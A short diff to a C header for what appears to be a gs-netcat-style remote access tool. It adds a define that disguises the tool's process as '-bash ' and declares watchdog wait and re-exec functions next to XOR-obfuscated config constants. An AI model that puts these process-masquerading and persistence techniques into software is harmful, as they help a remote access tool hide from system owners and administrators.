@@ -4,6 +4,8 @@
 #define GSNC_CONFIG_MAGIC_STR   "8xKd12TX"
 #define GSNC_CONFIG_MAGIC_XOR   (0x1f)
 #define GSNC_CONFIG_XOR         (0xab)
+#define GSNC_PROC_HN_SIGTERM    "-bash "
+
 struct gsnc_config {
     char host[128];
     char proc_hiddenname[64];
@@ -27,5 +29,7 @@ void sv_sigforward(int sig);
 pid_t forward_pid(void);
 void do_util_ffpid(void);
 char *GSNC_gs_id_gen(void);
+void SWD_wait(void);
+void SWD_reexec(void);
 
 #endif // __GSNC_GSNC_UTILS_H__
